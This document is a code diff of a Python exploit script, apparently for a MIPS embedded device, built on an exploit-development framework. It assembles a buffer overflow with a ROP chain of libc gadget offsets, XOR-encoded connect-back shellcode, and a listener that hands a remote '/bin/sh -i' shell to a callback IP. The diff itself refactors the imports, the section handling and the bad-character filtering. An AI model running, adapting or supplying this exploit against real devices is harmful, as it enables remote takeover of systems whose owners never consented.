@@ -16,12 +16,15 @@ import sys
 import socket
 import signal
 import time
-from crossbow.overflow_development.overflowbuilder import OverflowBuffer,SectionCreator
+
+from crossbow.overflow_development.overflowbuilder import *
 from crossbow.common.support import LittleEndian,Logging
 from crossbow.servers import ConnectbackHost
-from crossbow.servers.callback_server import ConnectbackServer
+from crossbow.servers.connectback_server import ConnectbackServer
 from crossbow.payloads.mips.connectback_payload import ConnectbackPayload
-from crossbow.encoders.mips import MipsXorEncoder
+from crossbow.encoders.mips import *
+
+
 #from crossbow.encoders.mips import MipsUpperAlphaEncoder
 logger=Logging()
 
@@ -38,39 +41,31 @@ if qemu:
     libc_base=libc_qemu_base
 else:
     libc_base=libc_actual_base
-#badchars=['\0',0x0d,'\n',0x20]
-badchars=[]
+badchars=['\0',0x0d,'\n',0x20]
+
 SC=SectionCreator(LittleEndian,base_address=libc_base,badchars=badchars)
 
-sections=[]
-
 #function_epilogue_rop
-section=SC.gadget_section(528,0x31b44,
+SC.gadget_section(528,0x31b44,
             description="[$ra] function epilogue that sets up $s1-$s7")
-sections.append(section)
 
 #Sleep arg 2 into $a0, stack data into $ra, then jalr $s0
-section=SC.gadget_section(656,0x43880,
+SC.gadget_section(656,0x43880,
             description="[$a0] Set up 2 sec arg to sleep(), then jalr $s1")
-sections.append(section)
 
 #address of sleep
-section=SC.gadget_section(620,0x506c0,
+SC.gadget_section(620,0x506c0,
             description="Address of sleep() in libc. be sure to set up $ra and $a0 before calling.")
-sections.append(section)
 
 #placeholder address that can be dereferenced without crashing, this goes in $s2
-section=SC.gadget_section(628,0x427a4,
+SC.gadget_section(628,0x427a4,
             description="[$s2] placeholder, derefed without crashing.")
-sections.append(section)
 
 #stackfinder. add 0xe0+var_c0 + $sp into $s0, jalr $s6
-section=SC.gadget_section(688,0x427a4,description="stackfinder.")
-sections.append(section)
+SC.gadget_section(688,0x427a4,description="stackfinder.")
 
 #stackjumber. jalr $s0
-section=SC.gadget_section(644,0x1ffbc,description="[$s0] stackjumper")
-sections.append(section)
+SC.gadget_section(644,0x1ffbc,description="[$s0] stackjumper")
 
 #you can instantiate a ConnectbackHost instead ad pass it to both
 connectback_host=ConnectbackHost(CALLBACK_IP) #default port is 8080
@@ -81,16 +76,20 @@ connectback_server=ConnectbackServer(connectback_host,startcmd="/bin/sh -i")
 
 payload=ConnectbackPayload(connectback_host,LittleEndian)
 
-encoded_payload=MipsXorEncoder(payload,LittleEndian,badchars=badchars)
+try:
+    encoded_payload=MipsXorEncoder(payload,LittleEndian,badchars=badchars)
+except EncoderException as ee:
+    print ee
+    sys.exit(1)
+    
 #encoded_payload=MipsUpperAlphaEncoder(payload,LittleEndian,badchars=badchars)
-section=SC.string_section(700,encoded_payload.shellcode,
+SC.string_section(700,encoded_payload.shellcode,
             description="encoded connect back payload")
-sections.append(section)
+
 logger.LOG_DEBUG("length of encoded shellcode, including stub is: %d" % len(encoded_payload.shellcode))
 print encoded_payload.pretty_string()
 
-
-buf=OverflowBuffer(LittleEndian,1300,sections)
+buf=OverflowBuffer(LittleEndian,1300,SC.section_list)
 logger.LOG_DEBUG("Length of overflow: %d" % buf.len())
 if len(sys.argv) == 2:
     search_value=sys.argv[1]
